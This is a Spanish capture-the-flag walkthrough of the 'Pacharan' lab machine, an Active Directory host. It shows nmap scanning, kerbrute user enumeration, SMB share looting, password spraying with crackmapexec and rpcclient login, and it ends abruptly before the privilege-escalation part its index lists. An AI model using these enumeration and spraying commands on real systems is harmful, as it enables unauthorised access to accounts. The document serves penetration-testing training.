@@ -1,0 +1,936 @@
+---
+layout: single
+title: Pacharan - TheHackerLabs
+excerpt: "."
+date: 2025-02-24
+classes: wide
+header:
+  teaser: /assets/images/THL-writeup-pacharan/_logo.png
+  teaser_home_page: true
+  icon: /assets/images/thehackerlabs.jpeg
+categories:
+  - TheHackerLabs
+  - Medium Machine
+tags:
+  - Windows
+  - Active Directory
+  - Kerberos
+  - SMB
+  - RPC
+  - Kerberos Enumeration
+  - SMB Enumeration
+  - RPC Enumeration
+  - Local Privilege Escalation (LPE)
+  - Abusing SeLoadDriverPrivilege Privilege
+  - Privesc - Abusing SeLoadDriverPrivilege Privilege
+  - OSCP Style
+---
+![](/assets/images/THL-writeup-pacharan/_logo.png)
+
+texto
+
+Herramientas utilizadas:
+* *ping*
+* *nmap*
+* *arp-scan*
+* *crackmapexec*
+* *smbmap*
+* *kerbrute_linux_amd64*
+* *rpcclient*
+* *evil-winrm*
+* *git*
+* *rlwrap*
+* *nc*
+* *msfvenom*
+
+
+<br>
+<hr>
+<div id="Indice">
+	<h1>Índice</h1>
+	<ul>
+		<li><a href="#Recopilacion">Recopilación de Información</a></li>
+			<ul>
+				<li><a href="#Ping">Traza ICMP</a></li>
+				<li><a href="#Puertos">Escaneo de Puertos</a></li>
+				<li><a href="#Servicios">Escaneo de Servicios</a></li>
+			</ul>
+		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#Kerberos">Enumeración de Usuarios del Servicio Kerberos</a></li>
+				<li><a href="#SMB">Enumeración de Servicio SMB</a></li>
+			</ul>
+		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
+			<ul>
+				<li><a href="#RPC">Enumeración del Servicio RPC y Obteniendo Sesión con evil-winrm</a></li>
+			</ul>
+		<li><a href="#Post">Post Explotación</a></li>
+			<ul>
+				<li><a href="#Privesc">Abusando del Privilegio SeLoadDriverPrivilege para Escalar Privilegios</a></li>
+			</ul>
+		<li><a href="#Links">Links de Investigación</a></li>
+	</ul>
+</div>
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
+</div>
+<br>
+
+
+<h2 id="Hosts">Descubrimiento de Hosts</h2>
+
+Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.
+
+Lo haremos primero con **nmap**:
+```bash
+nmap -sn 192.168.69.0/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 13:26 CST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Nmap scan report for 192.168.69.69
+Host is up (0.00092s latency).
+Nmap done: 256 IP addresses (4 hosts up) scanned in 1.94 seconds
+```
+
+Vamos a probar la herramienta **arp-scan**:
+```bash
+arp-scan -I eth0 -g 192.168.69.0/24
+Interface: eth0, type: EN10MB, MAC:XX, IPv4: Tu_IP
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.69.69	XX	PCS Systemtechnik GmbH
+.
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.081 seconds (123.02 hosts/sec). 3 responded
+```
+
+Encontramos nuestro objetivo y es: `192.168.69.69`
+
+<br>
+
+<h2 id="Ping">Traza ICMP</h2>
+
+Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
+```bash
+ping -c 4 192.168.69.69
+PING 192.168.69.69 (192.168.69.69) 56(84) bytes of data.
+64 bytes from 192.168.69.69: icmp_seq=1 ttl=128 time=1.51 ms
+64 bytes from 192.168.69.69: icmp_seq=2 ttl=128 time=1.03 ms
+64 bytes from 192.168.69.69: icmp_seq=3 ttl=128 time=0.838 ms
+64 bytes from 192.168.69.69: icmp_seq=4 ttl=128 time=0.824 ms
+
+--- 192.168.69.69 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3008ms
+rtt min/avg/max/mdev = 0.824/1.048/1.505/0.275 ms
+```
+Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.
+
+<h2 id="Puertos">Escaneo de Puertos</h2>
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.69.69 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 13:27 CST
+Initiating ARP Ping Scan at 13:27
+Scanning 192.168.69.69 [1 port]
+Completed ARP Ping Scan at 13:27, 0.06s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 13:27
+Scanning 192.168.69.69 [65535 ports]
+Discovered open port 139/tcp on 192.168.69.69
+Discovered open port 53/tcp on 192.168.69.69
+Discovered open port 445/tcp on 192.168.69.69
+Discovered open port 135/tcp on 192.168.69.69
+Discovered open port 389/tcp on 192.168.69.69
+Discovered open port 49667/tcp on 192.168.69.69
+Discovered open port 49671/tcp on 192.168.69.69
+Discovered open port 49676/tcp on 192.168.69.69
+Discovered open port 49665/tcp on 192.168.69.69
+Discovered open port 49664/tcp on 192.168.69.69
+Discovered open port 3269/tcp on 192.168.69.69
+Discovered open port 60909/tcp on 192.168.69.69
+Discovered open port 49666/tcp on 192.168.69.69
+Discovered open port 3268/tcp on 192.168.69.69
+Discovered open port 49673/tcp on 192.168.69.69
+Discovered open port 5985/tcp on 192.168.69.69
+Discovered open port 49669/tcp on 192.168.69.69
+Discovered open port 593/tcp on 192.168.69.69
+Discovered open port 636/tcp on 192.168.69.69
+Discovered open port 88/tcp on 192.168.69.69
+Discovered open port 47001/tcp on 192.168.69.69
+Discovered open port 49670/tcp on 192.168.69.69
+Increasing send delay for 192.168.69.69 from 0 to 5 due to max_successful_tryno increase to 4
+Discovered open port 464/tcp on 192.168.69.69
+Discovered open port 49691/tcp on 192.168.69.69
+Discovered open port 9389/tcp on 192.168.69.69
+Completed SYN Stealth Scan at 13:27, 41.39s elapsed (65535 total ports)
+Nmap scan report for 192.168.69.69
+Host is up, received arp-response (0.0020s latency).
+Scanned at 2025-02-24 13:27:08 CST for 41s
+Not shown: 65510 closed tcp ports (reset)
+PORT      STATE SERVICE          REASON
+53/tcp    open  domain           syn-ack ttl 128
+88/tcp    open  kerberos-sec     syn-ack ttl 128
+135/tcp   open  msrpc            syn-ack ttl 128
+139/tcp   open  netbios-ssn      syn-ack ttl 128
+389/tcp   open  ldap             syn-ack ttl 128
+445/tcp   open  microsoft-ds     syn-ack ttl 128
+464/tcp   open  kpasswd5         syn-ack ttl 128
+593/tcp   open  http-rpc-epmap   syn-ack ttl 128
+636/tcp   open  ldapssl          syn-ack ttl 128
+3268/tcp  open  globalcatLDAP    syn-ack ttl 128
+3269/tcp  open  globalcatLDAPssl syn-ack ttl 128
+5985/tcp  open  wsman            syn-ack ttl 128
+9389/tcp  open  adws             syn-ack ttl 128
+47001/tcp open  winrm            syn-ack ttl 128
+49664/tcp open  unknown          syn-ack ttl 128
+49665/tcp open  unknown          syn-ack ttl 128
+49666/tcp open  unknown          syn-ack ttl 128
+49667/tcp open  unknown          syn-ack ttl 128
+49669/tcp open  unknown          syn-ack ttl 128
+49670/tcp open  unknown          syn-ack ttl 128
+49671/tcp open  unknown          syn-ack ttl 128
+49673/tcp open  unknown          syn-ack ttl 128
+49676/tcp open  unknown          syn-ack ttl 128
+49691/tcp open  unknown          syn-ack ttl 128
+60909/tcp open  unknown          syn-ack ttl 128
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 41.64 seconds
+           Raw packets sent: 128995 (5.676MB) | Rcvd: 65539 (2.622MB)
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
+| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
+| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
+| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
+| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
+| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
+| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
+| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |
+
+Hay muchos puertos abiertos, pero estoy viendo algunos que nos dicen que estamos contra una máquina con **Active Directory (AD)**.
+
+<br>
+
+<h2 id="Servicios">Escaneo de Servicios</h2>
+
+```bash
+nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49673,49676,49691,60909 192.168.69.69 -oN targeted
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-24 13:30 CST
+mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+Nmap scan report for 192.168.69.69
+Host is up (0.0016s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-24 18:29:21Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PACHARAN.THL, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  msrpc         Microsoft Windows RPC
+49676/tcp open  msrpc         Microsoft Windows RPC
+49691/tcp open  msrpc         Microsoft Windows RPC
+60909/tcp open  msrpc         Microsoft Windows RPC
+MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+Service Info: Host: WIN-VRU3GG3DPLJ; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -1h01m36s
+| smb2-time: 
+|   date: 2025-02-24T18:30:15
+|_  start_date: 2025-02-24T12:10:46
+|_nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.43 seconds
+```
+
+| Parámetros | Descripción |
+|--------------------------|
+| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
+| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
+| *-p*       | Para indicar puertos específicos. |
+| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |
+
+Bien, confirmamos que estamos contra un **AD** y podemos ver que el **servicio SMB** parece necesitar credenciales para poder entrar. Además, parece que hubo un problema para escanear el **puerto 53** que pertenece al **servicio DNS**. Por lo que yo empezaria por el **puerto 88** que es **servicio Kerberos**.
+
+También pudimos ver el dominio del **AD**, este lo puedes registrar en el `/etc/hosts` quedando de la siguiente manera:
+```bash
+192.168.69.69 PACHARAN.THL
+```
+Con esto listo, continuemos.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
+</div>
+<br>
+
+
+<h2 id="Kerberos">Enumeración de Usuarios del Servicio Kerberos</h2>
+
+Necesitaremos comprobar si podemos usar un usuario X para poder ver y listar los recursos compartidos del **servicio SMB**.
+
+Pero como no tenemos ningún usuario, vamos a tratar de obtener algunos con la herramienta **Kerbrute**.
+
+Usaremos su función de enumeración de usuarios y un wordlists que contenga usuarios:
+```bash
+./kerbrute_linux_amd64 userenum -d PACHARAN.THL --dc 192.168.69.69 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 02/24/25 - Ronnie Flathers @ropnop
+
+2025/02/24 13:48:32 >  Using KDC(s):
+2025/02/24 13:48:32 >  	192.168.69.69:88
+
+2025/02/24 13:48:37 >  [+] VALID USERNAME:	 chivas@PACHARAN.THL
+2025/02/24 13:49:04 >  [+] VALID USERNAME:	 hendrick@PACHARAN.THL
+2025/02/24 13:49:07 >  [+] VALID USERNAME:	 whisky@PACHARAN.THL
+2025/02/24 13:49:11 >  [+] VALID USERNAME:	 gordons@PACHARAN.THL
+2025/02/24 13:49:34 >  [+] VALID USERNAME:	 redlabel@PACHARAN.THL
+2025/02/24 13:49:49 >  [+] VALID USERNAME:	 beefeater@PACHARAN.THL
+2025/02/24 13:49:53 >  [+] VALID USERNAME:	 Chivas@PACHARAN.THL
+2025/02/24 13:50:28 >  [+] VALID USERNAME:	 invitado@PACHARAN.THL
+2025/02/24 13:55:35 >  [+] VALID USERNAME:	 administrador@PACHARAN.THL
+```
+Encontramos varios usuarios. Te recomiendo que los guardes en un archivo de texto, por si los tenemos que usar más adelante.
+
+Podríamos probar con cualquiera, pero el único que nos va a funcionar es el **usuario invitado**.
+
+Comprobemoslo con **smbmap**:
+```bash
+smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Admin remota
+	C$                                                	NO ACCESS	Recurso predeterminado
+	IPC$                                              	READ ONLY	IPC remota
+	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+	NETLOGON2                                         	READ ONLY	
+	PACHARAN                                          	NO ACCESS	
+	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
+	print$                                            	NO ACCESS	Controladores de impresora
+	SYSVOL                                            	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+	Users                                             	NO ACCESS	
+[*] Closed 1 connections
+```
+Funciona bien. Bastante curioso ese recurso llamado `PDF Pro Virtual Printer`, más que nada por su descripción.
+
+Veamos que podemos encontrar.
+
+<br>
+
+<h2 id="SMB">Enumeración de Servicio SMB</h2>
+
+Antes que nada, podemos comprobar que este servicio necesita credenciales para poder ver los recursos compartidos:
+```bash
+crackmapexec smb 192.168.69.69
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
+```
+
+Ya vimos que el **usuario invitado** puede ver el contenido del **directorio NETLOGON2**.
+
+Veamos que hay dentro:
+```bash
+smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado' -r NETLOGON2
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Admin remota
+	C$                                                	NO ACCESS	Recurso predeterminado
+	IPC$                                              	READ ONLY	IPC remota
+	NETLOGON                                          	NO ACCESS	Recurso compartido del servidor de inicio de sesión 
+	NETLOGON2                                         	READ ONLY	
+	./NETLOGON2
+	dr--r--r--                0 Wed Jul 31 11:25:34 2024	.
+	dr--r--r--                0 Wed Jul 31 11:25:34 2024	..
+	fr--r--r--               22 Wed Jul 31 11:25:55 2024	Orujo.txt
+	PACHARAN                                          	NO ACCESS
+....
+....
+```
+Hay un archivo de texto.
+
+Vamos a descargarlo:
+```bash
+smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'invitado' --download NETLOGON2/Orujo.txt
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+[+] Starting download: NETLOGON2\Orujo.txt (22 bytes)                                                                    
+[+] File output to: /../TheHackersLabs/Pacharan/content/192.168.69.69-NETLOGON2_Orujo.txt
+[*] Closed 1 connections
+```
+
+Veamos que contiene este archivo
+```bash
+cat 192.168.69.69-NETLOGON2_Orujo.txt
+Pericodelospalotes6969
+```
+Parece ser una contraseña.
+
+Podríamos comprobar si está contraseña es de algún usuario que ya tenemos.  
+
+Podemos aplicar **password spraying** con **crackmapexec**:
+```bash
+crackmapexec smb 192.168.69.69 -u users.txt -p 'Pericodelospalotes6969' --no-brute --continue-on-success
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\chivas:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\hendrick:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\whisky:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\gordons:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\redlabel:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\beefeater:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\invitado:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\administrador:Pericodelospalotes6969 STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\:Pericodelospalotes6969
+```
+Parece que no pertenece a ninguno.
+
+Quizá el nombre del archivo es el nombre de un usuario. Vamos a comprobarlo:
+```bash
+crackmapexec smb 192.168.69.69 -u 'Orujo' -p 'Pericodelospalotes6969'
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\Orujo:Pericodelospalotes6969
+```
+En efecto, es un usuario.
+
+Veamos que puede ver este usuario:
+```bash
+smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+                                                                                                                             
+[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Admin remota
+	C$                                                	NO ACCESS	Recurso predeterminado
+	IPC$                                              	READ ONLY	IPC remota
+	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesión 
+	NETLOGON2                                         	NO ACCESS	
+	PACHARAN                                          	READ ONLY	
+	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
+	print$                                            	NO ACCESS	Controladores de impresora
+...
+...
+```
+Parece que podemos ver el **directorio PACHARAN**.
+
+Veamos su contenido:
+```bash
+smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969' -r PACHARAN
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
+                                                                                                                             
+[+] IP: 192.168.69.69:445	Name: PACHARAN.THL        	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Admin remota
+	C$                                                	NO ACCESS	Recurso predeterminado
+	IPC$                                              	READ ONLY	IPC remota
+	NETLOGON                                          	READ ONLY	Recurso compartido del servidor de inicio de sesión 
+	NETLOGON2                                         	NO ACCESS	
+	PACHARAN                                          	READ ONLY	
+	./PACHARAN
+	dr--r--r--                0 Wed Jul 31 11:21:13 2024	.
+	dr--r--r--                0 Wed Jul 31 11:21:13 2024	..
+	fr--r--r--              921 Wed Jul 31 11:21:13 2024	ah.txt
+	PDF Pro Virtual Printer                           	NO ACCESS	Soy Hacker y arreglo impresoras
+...
+...
+```
+Parece ser otro archivo de texto.
+
+Vamos a descargarlo:
+```bash
+smbmap -H 192.168.69.69 -d PACHARAN.THL -u 'Orujo' -p 'Pericodelospalotes6969' --download PACHARAN/ah.txt
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB                                                                                                  
+[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
+[+] Starting download: PACHARAN\ah.txt (921 bytes)
+[+] File output to: /../TheHackersLabs/Pacharan/content/192.168.69.69-PACHARAN_ah.txt          
+[*] Closed 1 connections
+```
+
+Y veamos su contenido:
+```bash
+cat 192.168.69.69-PACHARAN_ah.txt
+Mamasoystreamer1!
+Mamasoystreamer2@
+Mamasoystreamer3#
+...
+...
+```
+Es una lista de posibles contraseñas de algún usuario.
+
+Probemos si alguno de los usuarios que tenemos tiene una contraseña que este dentro de esta lista.
+
+Lo haremos con **crackmapexec**:
+```bash
+crackmapexec smb 192.168.69.69 -u users.txt -p ah.txt
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-VRU3GG3DPLJ) (domain:PACHARAN.THL) (signing:True) (SMBv1:False)
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\chivas:Mamasoystreamer1! STATUS_LOGON_FAILURE 
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [-] PACHARAN.THL\chivas:Mamasoystreamer2@ STATUS_LOGON_FAILURE
+...
+...
+...
+SMB         192.168.69.69   445    WIN-VRU3GG3DPLJ  [+] PACHARAN.THL\whisky:***
+```
+Encontramos una contraseña que le pertenece al **usuario whisky**.
+
+Podríamos probar si este usuario puede enumerar algo más de este servicio, pero te adelanto que no hay nada más.
+
+Por lo que podemos continuar con otro servicio.
+
+
+<br>
+<br>
+<hr>
+<div style="position: relative;">
+  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
+</div>
+<br>
+
+
+<h2 id="RPC">Enumeración del Servicio RPC y Obteniendo Sesión con evil-winrm</h2>
+
+Lo siguiente que podemos hacer, es ver si podemos enumerar el **servicio RPC**.
+
+Esto lo haremos con el último usuario y contraseña que encontramos, utilizando la herramienta **rpcclient**:
+```bash
+rpcclient -U "whisky%MamasoyStream2er@" 192.168.69.69
+rpcclient $> enumdomusers
+user:[Administrador] rid:[0x1f4]
+user:[Invitado] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[Orujo] rid:[0x44f]
+user:[Ginebra] rid:[0x450]
+user:[Whisky] rid:[0x452]
+user:[Hendrick] rid:[0x453]
+user:[Chivas Regal] rid:[0x454]
+user:[Whisky2] rid:[0x457]
+user:[JB] rid:[0x458]
+user:[Chivas] rid:[0x459]
+user:[beefeater] rid:[0x45a]
+user:[CarlosV] rid:[0x45b]
+user:[RedLabel] rid:[0x45c]
+user:[Gordons] rid:[0x45d]
+```
+Bien, entramos y funcionan los comandos que usemos.
+
+Veamos si podemos obtener alguna contraseña al revisar la descripción de los usuarios con el comando **querydispinfo**:
+```bash
+rpcclient $> querydispinfo
